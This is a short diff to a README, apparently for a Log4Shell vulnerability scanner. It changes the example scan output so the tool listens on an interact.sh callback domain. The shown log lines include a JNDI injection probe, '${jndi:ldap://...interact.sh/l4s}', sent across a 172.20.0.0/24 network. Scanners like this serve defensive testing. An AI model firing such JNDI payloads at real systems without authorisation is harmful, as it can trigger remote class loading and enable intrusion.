@@ -219,8 +219,8 @@ Global Flags:
 ```bash
 make run-remote
 
-scanner_1  | [i] Log4Shell CVE-2021-44228 Remote Vulnerability Scan
-scanner_1  | [i] Listening on 172.20.0.30:4444
+scanner_1  | [i] Log4Shell Remote Vulnerability Scan
+scanner_1  | [i] Listening on c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh
 scanner_1  | [i] Start scanning CIDR 172.20.0.0/24
 scanner_1  | ---------
 scanner_1  | [i] Checking ${jndi:ldap://c6vgseoaa6gikh9v1ekgcg9ohxoyyyyyn.interact.sh/l4s} for http://172.20.0.0:8080
